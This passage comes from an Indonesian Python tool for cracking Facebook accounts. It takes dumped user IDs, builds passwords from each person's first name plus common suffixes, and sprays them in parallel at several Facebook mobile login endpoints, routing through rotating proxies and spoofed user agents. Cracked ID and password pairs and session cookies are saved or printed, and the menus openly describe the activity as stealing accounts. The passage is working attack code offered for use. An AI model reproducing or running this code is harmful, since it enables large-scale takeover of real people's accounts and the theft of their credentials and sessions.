				print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+u)
				print('➥➥➣%s. %s ({h} %s {u}idz) '%(cih,isi,len(hem)))
		geeh = input('\n➥➥➣Pilih : ')
		try:geh = lol[geeh]
		except KeyError:
			print(f'{k}➥➥➣Pilih Yang Bener Kontol {u}')
			time.sleep(3)
			back()
		try:lin = open('DUMP/'+geh,'r').read().splitlines()
		except:
			print('➥➥➣File Tidak Ditemukan, Coba Lagi Nanti ')
			time.sleep(2)
			back()
		for xid in lin:
			id.append(xid)
		setting()
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	cetak(nel('\t[bold cyan]         • PENGEN MALING YANG MANA • [/bold cyan]'))
	print('') 
	cetak(nel('[bold yellow]🇮🇩➣1. Maling Akun Old \n🇮🇩➣2. Maling Akun New\n🇮🇩➣3. Maling Akun Random [bold yellow]'))
	print('')
	hu = input('➥➥➣Pilih : ')
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)

	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print('➥➥➣Pilih Yang Bener Kontooll ')
		exit()
	cetak(nel('\t[bold cyan]             • METODE LOGIN • [/bold cyan]'))
	print('') 
	cetak(nel('[bold purple]🇮🇩➣1. Mobile (Sangat Disarankan)\n🇮🇩➣2. Mobile V2 (Disarankan)\n🇮🇩➣3. Touch\n🇮🇩➣4. Mtouch [bold purple]')) 
	print('')
	hc = input('>> Pilih : ')
	if hc in ['1','01']:
		method.append('mobile')
	elif hc in ['2','02']:
		method.append('free')
	elif hc in ['3','03']:
		method.append('touch')
	elif hc in ['4','04']:
		method.append('mbasic')
	else:
		method.append('mobile')
	print(f'{m}CATATAN :\n🎀{k}DISARANKAN TIDAK MENAMPILKAN APLIKASI\n🎀DISARANKAN GUNAKAN PASWORD DEPAULT ') 
	print('')
	_jembot_ = input('➥➥➣Tampilkan Aplikasi ( Y/t ) ')
#	if _jembot_ in ['']:
#		print('➥➥➣Pilih Yang Bener Kontol ')
#		back()
#	elif _jembot_ in ['y','Y']:
#		taplikasi.append('ya')
#	else:
#		taplikasi.append('no')
	pwplus=input('➥➥➣Tambahkan Password Manual/depault( m/d ) ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		cetak(nel('[[purple]•[yellow]] Masukkan Katasandi Tambahan Minimal 6 Karakter\n[[purple]•[yellow]] Contoh :[green] kakak,ngentod,adik[purple] '))
		pwku=input('#➥➥➣Masukkan Password Tambahan : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	passwrd()
	exit() 
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	global prog,des
	cetak(nel('[bold cyan]               JANGAN LUPA BERDOA, SEMOGA MALINGNYA LANCARRRRR....!!!!!! [bold cyan]')) 
	print(f'                    {m}H {k}A {h}R {u}A {b}P {u}  ★  {b}S {u}A {h} B{k} A{m} R{b}')
	print('')
	print(f'➥➥➣Hasil {h}OK{u} Tersimpan Di : {h}OK/%s {b}'%(okc))
	print(f'➥➥➣Hasil {k}CP{h} Tersimpan Di : {k}CP/%s {b}'%(cpc))
	print(f'➥➥➣Mainkan Mode Pesawat Setiap {h}1k{u} Idz\n')
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id))
	with prog:
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwv = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(frs+'321')
						pwv.append(frs+'123')
						pwv.append(frs+'1999')
						pwv.append(frs+'2000')
						pwv.append(frs+'2002')
						pwv.append(frs+'2004')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'123456')
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(frs+'321')
						pwv.append(frs+'123')
						pwv.append(frs+'1999')
						pwv.append(frs+'2000')
						pwv.append(frs+'2002')
						pwv.append(frs+'2004')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'123456')
				if 'ya' in pwpluss:
					for xpwd in pwnya:
						pwv.append(xpwd)
				else:pass
				if 'mobile' in method:
					pool.submit(crack,idf,pwv)
				elif 'free' in method:
					pool.submit(crackfree,idf,pwv)
				elif 'touch' in method:
					pool.submit(cracktouch,idf,pwv)
				elif 'mbasic' in method:
					pool.submit(crackmbasic,idf,pwv)
				else:
					pool.submit(crackmbasic,idf,pwv)
		print('')
		cetak(nel('\t[purple]➥➥➣[green] Maling Selesai Ngab, Jangan Lupa Bersyukur[purple] <<[yellow] '))
		print(f'[{h}•{u}]{h} OK : {h}%s '%(ok))
		print(f'{k}[{k}•{h}]{k} CP : {k}%s{u} '%(cp))
		print('')
		print('{k}➥➥➣Lanjut Crack Kembali ( Y/t ) ? ')
		woi = input('➥➥➣Pilih : ')
		if woi in ['y','Y']:
			back()
		else:
			print(f'\t{x}➥➥➣{k} Good Bye Dadaahh{u} ')
			time.sleep(2)
			exit()
#--------------------[ METODE-B-API ]-----------------#
def crack(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	prog.update(des,description=f'\r[deep_white] {bo}[{idf}]{P} {(loop)}/{len(id)}[/] [bold green]OK[/]:[bold green]{(ok)} [/]=[bold yellow] CP[/]:[bold yellow]{(cp)}')
	prog.advance(des)
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=274266067164&kid_directed_site=0&app_id=274266067164&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.7%2Fdialog%2Foauth%3Fapp_id%3D274266067164%26cbt%3D1678532779361%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df1836ef0ce87354%2526domain%253Did.pinterest.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fid.pinterest.com%25252Ff1cbf9e775cfe2c%2526relation%253Dopener%26client_id%3D274266067164%26display%3Dtouch%26domain%3Did.pinterest.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fid.pinterest.com%252Flogin%26locale%3Den_US%26logger_id%3Df203cf51e81eaf%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df370aed707263b8%2526domain%253Did.pinterest.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fid.pinterest.com%25252Ff1cbf9e775cfe2c%2526relation%253Dopener%2526frame%253Df7339f0a9b07%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Dpublic_profile%252Cemail%252Cuser_birthday%252Cuser_friends%26sdk%3Djoey%26version%3Dv2.7%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df370aed707263b8%26domain%3Did.pinterest.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fid.pinterest.com%252Ff1cbf9e775cfe2c%26relation%3Dopener%26frame%3Df7339f0a9b07%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v2.7/dialog/oauth?app_id=274266067164&cbt=1678532779361&channel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df1836ef0ce87354%26domain%3Did.pinterest.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fid.pinterest.com%252Ff1cbf9e775cfe2c%26relation%3Dopener&client_id=274266067164&display=touch&domain=id.pinterest.com&e2e=%7B%7D&fallback_redirect_uri=https%3A%2F%2Fid.pinterest.com%2Flogin&locale=en_US&logger_id=f203cf51e81eaf&origin=2&redirect_uri=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df370aed707263b8%26domain%3Did.pinterest.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fid.pinterest.com%252Ff1cbf9e775cfe2c%26relation%3Dopener%26frame%3Df7339f0a9b07&response_type=token%2Csigned_request%2Cgraph_domain&scope=public_profile%2Cemail%2Cuser_birthday%2Cuser_friends&sdk=joey&version=v2.7&ret=login&fbapp_pres=0&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https://mobile.facebook.com/v2.7/dialog/oauth?app_id=274266067164&cbt=1678561086297&channel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df37dcc3c19679%26domain%3Did.pinterest.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fid.pinterest.com%252Ff17428537c03f8%26relation%3Dopener&client_id=274266067164&display=touch&domain=id.pinterest.com&e2e=%7B%7D&fallback_redirect_uri=https%3A%2F%2Fid.pinterest.com%2F&locale=id_ID&logger_id=f36380fd88f4f0c&origin=2&redirect_uri=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df11bd3e88e93a48%26domain%3Did.pinterest.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fid.pinterest.com%252Ff17428537c03f8%26relation%3Dopener%26frame%3Df398e03f55849c8&response_type=token%2Csigned_request%2Cgraph_domain&scope=public_profile%2Cemail%2Cuser_birthday%2Cuser_friends&sdk=joey&version=v2.7&ret=login&fbapp_pres=0&tp=unspecified&cancel_url=https://staticxx.facebook.com/x/connect/xd_arbiter/?version=46#cb=f11bd3e88e93a48&domain=id.pinterest.com&is_canvas=false&origin=https%3A%2F%2Fid.pinterest.com%2Ff17428537c03f8&relation=opener&frame=f398e03f55849c8&error=access_denied&error_code=200&error_description=Permissions+error&error_reason=user_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdc=1&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				cetak(nel('[bold yellow]          😭 MAMPUS CHECKPOINT 😭[bold yellow]'))
				print(f'\r{K}>> {idf}|{pw}\n>> {ua}{N}')     
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				cetak(nel('[bold green]          🎀🤑 SELAMAT GANTENG DAPAT IJO 🤑🎀[bold green]')) 
				print(f'\r{H}>> {idf}|{pw}\n>> {kuki}{N}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
				cek_apk(session,coki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#------------------[ METHODE-MBASIC-2 ]-------------------#
def crackfree(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	pers = loop*100/len(id2)
	fff = '%'
	prog.update(des,description=f'\r[deep_white] {bo}[{idf}]{P} {(loop)}/{len(id)}[/] [bold green]OK[/]:[bold green]{(ok)} [/]=[bold yellow] CP[/]:[bold yellow]{(cp)}')
	prog.advance(des)
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/?stype=lo&jlou=AfeHk-CAJvdGaHk4jrPG5UtFn4CKHtir7fjddC1Yn0kMD7n1Kct_NlHp4ILanYLiuOMHerEBIaAAGZpqIronHYoLKX2b3Z4J_2orkzUezPFFPw&smuh=4646&lh=Ac_94l2RFc-vs30xNbg&_rd","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'ms-MY,ms;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				cetak(nel('  [bold yellow]      😭 MAMPUS CHECKPOINT 😭[bold yellow]'))
				print(f'\r{K}>> {idf}|{pw}\n>> {ua}{N}')     
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				cetak(nel('[bold green]      🎀🤑 SELAMAT GANTENG DAPAT IJO 🤑🎀[bold green]')) 
				print(f'\r{H}>> {idf}|{pw}\n>> {kuki}{N}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
				cek_apk(session,coki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

#---------------------[ METHODE-TOUCH-3 ]---------------------#
def cracktouch(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	pers = loop*100/len(id2)
	fff = '%'
	prog.update(des,description=f'\r[deep_white] {bo}[{idf}]{P} {(loop)}/{len(id)}[/] [bold green]OK[/]:[bold green]{(ok)} [/]=[bold yellow] CP[/]:[bold yellow]{(cp)}')
	prog.advance(des)
	nip=random.choice(prox)
	proxs= {'http': 'socks5://'+nip}
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			ses.headers.update({'Host': 'mtouch.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://d.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://d.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'd.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://d.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://d.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'fr_FR,fr;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
			po = ses.post('https://d.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				cetak(nel('  [bold yellow]      😭 MAMPUS CHECKPOINT 😭[bold yellow]'))
				print(f'\r{K}>> {idf}|{pw}\n>> {ua}{N}')     
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				cetak(nel('[bold green]      🎀🤑 SELAMAT GANTENG DAPAT IJO 🤑🎀[bold green]')) 
				print(f'\r{H}>> {idf}|{pw}\n>> {kuki}{N}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
				cek_apk(session,coki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#----------------------[ METHODE-MTOUCH+MOBILE-4 ]-----------------#
def crackmbasic(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	pers = loop*100/len(id2)
	fff = '%'
	nip=random.choice(prox)
	proxs= {'http': 'socks5://'+nip}
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f'\r[deep_white] {bo}[{idf}]{P} {(loop)}/{len(id)}[/] [bold green]OK[/]:[bold green]{(ok)} [/]=[bold yellow] CP[/]:[bold yellow]{(cp)}')
	prog.advance(des)
	for pw in pwv:
		try:
			ses.headers.update({'Host': 'x.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://x.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://x.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'x.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://x.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://x.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'fr_FR,fr;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
			po = ses.post('https://x.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				cetak(nel('  [bold yellow]      😭 MAMPUS CHECKPOINT 😭[bold yellow]'))
				print(f'\r{K}>> {idf}|{pw}\n>> {ua}{N}')     
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				cetak(nel('[bold green]      🎀🤑 SELAMAT GANTENG DAPAT IJO 🤑🎀[bold green]')) 
				print(f'\r{H}>> {idf}|{pw}\n>> {kuki}{N}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
				cek_apk(session,coki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#--------------------[ CHECK-OPSI-CHEKPOINT ]-------------------#
def ceker(idf,pw):
	global cp
	ua = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.128 Safari/537.36 FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.services;FBDV/EVR-L29;FBSV/10;FBLR/0;FBBK/1;FBCA/arm64-v8a:;]'
	head = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
	ses = requests.Session()
	try:
		hi = ses.get('https://mbasic.facebook.com')
		ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':idf,'pass':pw,'login':'submit'}, headers=head, allow_redirects=True).text,'html.parser')
		jo = ho.find('form')
		data = {}
		lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
		for anj in jo('input'):
			if anj.get('name') in lion:
				data.update({anj.get('name'):anj.get('value')})
		kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=head).text,'html.parser')
		print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1
		opsi = kent.find_all('option')
		if len(opsi)==0:
			print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
		else:
			for opsii in opsi:
				print('\r%s---> %s%s'%(kk,opsii.text,x))
	except Exception as c:
		print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))
		print('\r%s---> Tidak Dapat Mengecek Opsi (Cek Login Di Lite/Mbasic)%s'%(u,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1
#--------------------------[ CHECK-OPSI-CHEKPOINT-2 ]----------------#
def cek_opsi():
	c = len(akun)
	hu = 'Terdapat %s Akun Untuk Dicek\nSebelum Mulai, Mode Pesawat/Ubah Kartu Sim Terlebih Dahulu'%(c)
	cetak(nel(hu, title='CEK OPSI'))
	input(u+'['+h+'•'+u+'] Mulai')
	cek = '# PROSES CEK OPSI DIMULAI'
	sol().print(mark(cek, style='green'))
	love = 0
	for kes in akun:
		try:
			try:
				id,pw = kes.split('|')[0],kes.split('|')[1]
			except IndexError:
				time.sleep(2)
				print('\r%s++++ %s ----> Error      %s'%(b,kes,x))
				print('\r%s---> Pemisah Tidak Didukung Untuk Program Ini%s'%(u,x))
				continue
			bi = random.choice([u,k,kk,b,h,hh])
			print('\r%s---> %s/%s ---> { %s }%s'%(bi,love,len(akun),id,x), end=' ');sys.stdout.flush()
			ua = 'Mozilla/5.0 (Linux; Android 11; TECNO KD8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4755.101 Mobile Safari/537.36'
			ses = requests.Session()
			header = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			hi = ses.get('https://mbasic.facebook.com')
			ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':id,'pass':pw,'login':'submit'}, headers=header, allow_redirects=True).text,'html.parser')
			if "checkpoint" in ses.cookies.get_dict().keys():
				try:
					jo = ho.find('form')
					data = {}
					lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
					for anj in jo('input'):
						if anj.get('name') in lion:
							data.update({anj.get('name'):anj.get('value')})
					kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=header).text,'html.parser')
					print('\r%s++++ %s|%s ----> CP       %s'%(b,id,pw,x))
					opsi = kent.find_all('option')
					if len(opsi)==0:
						print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
					else:
						for opsii in opsi:
							print('\r%s---> %s%s'%(kk,opsii.text,x))
				except:
					print('\r%s++++ %s|%s ----> CP       %s'%(b,id,pw,x))
					print('\r%s---> Tidak Dapat Mengecek Opsi%s'%(u,x))
			elif "c_user" in ses.cookies.get_dict().keys():
				print('\r%s++++ %s|%s ----> OK       %s'%(h,id,pw,x))
			else:
				print('\r%s++++ %s|%s ----> SALAH       %s'%(x,id,pw,x))
			love+=1
		except requests.exceptions.ConnectionError:
			print('')
			li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
			sol().print(mark(li, style='red'))
			exit()
	dah = '# DONE'
	sol().print(mark(dah, style='green'))
	exit()
#----------------------[ CEK-APLIKASI ]---------------------#
def cek_apk(session,cookie):
